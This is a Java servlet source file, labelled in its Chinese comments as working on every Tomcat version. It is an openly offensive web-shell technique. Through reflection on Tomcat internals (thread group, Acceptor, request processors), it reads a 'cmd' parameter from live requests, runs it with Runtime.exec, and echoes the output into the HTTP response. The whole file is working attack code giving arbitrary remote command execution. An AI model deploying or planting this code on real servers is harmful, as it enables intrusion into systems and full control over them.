package com.example.TomcatHalfEcho.Controller;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

import java.util.Scanner;

// 全 Tomcat 版本通用

@WebServlet("/AllTomcat")
public class AllTomcatVersionAttack extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

        try {
            // 获取thread数组
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsField =  ThreadGroup.class.getDeclaredField("threads");
            threadsField.setAccessible(true);
            Thread[] threads = (Thread[])threadsField.get(threadGroup);

            for(Thread thread:threads) {
                Field targetField = Thread.class.getDeclaredField("target");
                targetField.setAccessible(true);
                Object target  = targetField.get(thread);
                if( target != null && target.getClass() == org.apache.tomcat.util.net.Acceptor.class ) {
                    Field endpointField = Class.forName("org.apache.tomcat.util.net.Acceptor").getDeclaredField("endpoint");
                    endpointField.setAccessible(true);
                    Object endpoint = endpointField.get(target);
                    Field handlerField = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handlerField.setAccessible(true);
                    Object handler = handlerField.get(endpoint);

                    // 获取内部类ConnectionHandler的global
                    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

                    // 获取RequestGroupInfo的processors
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);


                    // 获取Response，并做输出处理
                    Field reqField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    reqField.setAccessible(true);
                    for (RequestInfo requestInfo : RequestInfolist) {//遍历
                        org.apache.coyote.Request coyoteReq = (org.apache.coyote.Request) reqField.get(requestInfo);//获取request
                        org.apache.catalina.connector.Request connectorRequest = (org.apache.catalina.connector.Request) coyoteReq.getNote(1);//获取catalina.connector.Request类型的Request
                        org.apache.catalina.connector.Response connectorResponse = connectorRequest.getResponse();

                        // 从connectorRequest 中获取参数并执行
                        String cmd = connectorRequest.getParameter("cmd");
                        String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                        // 方法一
//                connectorResponse.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));
//                connectorResponse.flushBuffer();

                        // 方法二
                        java.io.Writer w = response.getWriter();//获取Writer
                        Field responseField = ResponseFacade.class.getDeclaredField("response");
                        responseField.setAccessible(true);
                        Field usingWriter = Response.class.getDeclaredField("usingWriter");
                        usingWriter.setAccessible(true);
                        usingWriter.set(connectorResponse, Boolean.FALSE);//初始化
                        w.write(res);
                        w.flush();//刷新
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}